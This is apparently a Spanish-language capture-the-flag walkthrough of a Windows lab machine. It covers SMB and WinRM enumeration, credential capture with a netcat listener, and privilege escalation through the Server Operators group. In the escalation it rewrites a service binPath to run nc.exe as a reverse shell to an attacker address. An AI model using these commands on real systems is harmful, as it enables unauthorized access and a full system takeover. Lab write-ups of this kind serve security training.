## Summary

Tags: #Windows #SMB #WinRM #ReverShell #Netcat #NetUser  #Nmap 

- IP -> 
- Ports -> TCP (53,80,88,135,139,389,445,5985), UDP (idk)
- OS ->  Windows 
- Services & Applications
    - 80  -> HTTP microsoft IIS/10.0
    - 445 -> SMB
    - 5985 -> WinRM


## Launchpad

-   **Launchpad**: [https://launchpad.net/ubuntu](https://launchpad.net/ubuntu)

## Recon
Windows IIS (10.0)

```bash
❯ whatweb ❮http://IP❯                  # Nos dara una breve descripcion del gestor de contenidos del puerto 80

	# Mirar la jQuery
	# Servidor Web
```

```bash
❯ nc -nlvp 389 
```
Nos ponemos a explorar la pagina web y encontramos que podiamos hacer que la pagina al momento de hacerle Update, esta apuntara a nuestra IP y asi con nc ver el contenido y nos devuelve un User y una Passwd

```bash
❯ smbclient -L ❮IP❯                   # Lista recursos compartidos a nivel de red haciendo uso de un null sesion (sin credencial alguna)
❯ smbclient -L ❮IP❯ -N                # Lista recursos compartidos a nivel de red haciendo uso de un null sesion (sin credencial alguna)
```

```bash
❯ smbmap -H ❮IP❯                      # Herramienta elternativa para ver si nos reporta algo mas y nos reporta los permisos (WRITE, READ)
❯ smbmap -H ❮IP❯ -u 'null'            # Herramienta elternativa para ver si nos reporta algo mas haciendo uso de un null sesion (sin credencial alguna)
```

```bash
❯ crackmapexec smb ❮IP❯ -u ❮‘user’❯ -p ❮‘password’❯      # Para el servicio 445/tcp smb abierto podemos utilizar el siguiente comando para saber si tenemos credenciales validas, por lo que si nos muestra un (+) quiere decir que si son validas, ademas de que nos da informacion de lo que hay en ese servico (nombre, Windows 10.0, dominio, signing=true)(u=user, p=password) Este comando es usado para validar aunque tenga mas aplicaciones.

❯ crackmapexec winrm ❮IP❯ -u ❮‘user’❯ -p ❮‘password’❯    # Despues de saber que las credenciales son validas con crackmapexec, podemos utilizar el puerto de winrm para saber si podemos entrar, pero antes debemos saber si el usuario esta en el grupo Remote management users, para saber si pertenece nos debe poner un (Pwn3d!) y asi podernos autenticar.

# Podemos usar evil-winrm para conectarnos, si tiene el puerto 5985 abierto
```

## User
Ahora podemos usar el puerto 5985 para poder ingresar con WINRM
```bash
❯ evil-winrm -i ❮IP❯ -u ❮‘user’❯ -p ❮‘password’❯         # Nos podemos conectar ya al servicio de administracion remota de Windows
```
Una vez adentro buscamos la flag del usuario user.txt en Desktop

Ahora nos disponemos a probar comandos para ver como poder escalar privilegios en la maquina Windows
```bash
❯  whoami /priv                              # Miramos los privilegios que tenemos   
	
	# SetInpersonatePrivilege = En el cual podriamos usar RottenPotato o  JuicyPotato 
	# SetLoadPrivilege = Para usar el recurso de Tarlogic

❯  whoami /all                               # Miramos todos los privilegios
```

```bash
❯ systeminfo                                 # Nos copiamos todo lo que nos salga con ese comando y usaremos un programa llamado '' para deterctar vulnerabilidades en un equipo Windows, todo desde nuestra maquina Linux con el archivo que hemos creado con ese informacion obtenida.
```

```bash
❯ net user <USER>                            # Nos da detalles de nuestro usuario y vemos a que grupos pertenecemos. 


# Server Operators = Es un grupo en el que podemos administrar controladores de dominio, loggearse a un servicio interactivo, asi como crear, borrar recursos compartidos en la red, iniciar, parar servicios, back up, restaurar archivos, formatear el disco duro de la computadora y apagarla. Si pertenecemos a este grupo podemos cargar a la maquina victima Netcat.exe.
```

Ahora buscamos en Google la parte de Server Operators para ver que significa y que podemos hacer.
Los miembros de **Server Operators** pueden administrar el domain controller. Pueden hacer las siguientes acciones, iniciar sesión en un servidor de forma interactiva, crear y eliminar recursos compartidos de red, iniciar y detener servicios, realizar copias de seguridad y restaurar archivos, formatear la unidad de disco duro de la computadora y apagar la computadora. Este grupo no puede ser renombrado, eliminado o removido.

Por lo que nos ponemos a utilizar Netcat para poder entrar 
Buscamos el archivo nc.exe en la maquina atacante para despues subirlo a la maquina victima en el directorio Temp, ya que en ese directorio hay permisos de lectura y escritura.

```bash
❯ upload /home/omar/Documet/HTB/nc.exe       # Subimos el archivo Netcat a la maquina victima, colocando la ruta absoluta de la maquina de atacante en donde se encuentra
```

Despues podemos crear una revershell y ver si podemos crear un servicio 
```bash
❯ sc.exe create reverse binPath=”C:\\Users\\svc-printer\\Documents\\nc.exe -e cmd 10.10.14.10 443” # Le decimos al equipo victima que cuando arranque el servicio queremos que ejecute el netcat y nos ejecute una revershell contra el nuestro equipo por el puerto 443. (create=creamos el servicio, reverse=nombre del servicio) 

# Si no nos deja, hacemos lo siguiente:
❯ Services                            # Para ver los servicios que estan corriendo en Windows y asi ver si podemos cambiarle el binPath a uno, esto dependiendo si nos encontramos en el grupo de 'Server Operators' y asi podernos montar una revershell con algun servicio con sc.exe
❯ sc.exe config VMTools binPath=”C:\\Users\\svc-printer\\Documents\\nc.exe -e cmd 10.10.14.10 443” # Colocaremos un servicio que nos deje cambiar su binPath, el servicio va despues de config. (Nos saldra success)
```

## Root

```bash
❯ nc -nlvp 443 
```

Despues paramos el servicio que hemos reconfigurado y lo volvemos a iniciar para que se ejecute el netcat.
```bash
❯ sc.exe stop VMTools              # Paramos el servicio
❯ sc.exe start VMTools             # Iniciamos el servicio
```

Nos damos cuenta que ya somo **NT Autority System** y tenemos los privilegios de administrador, por lo que nos dirigimos a buscar la flag roo.txt

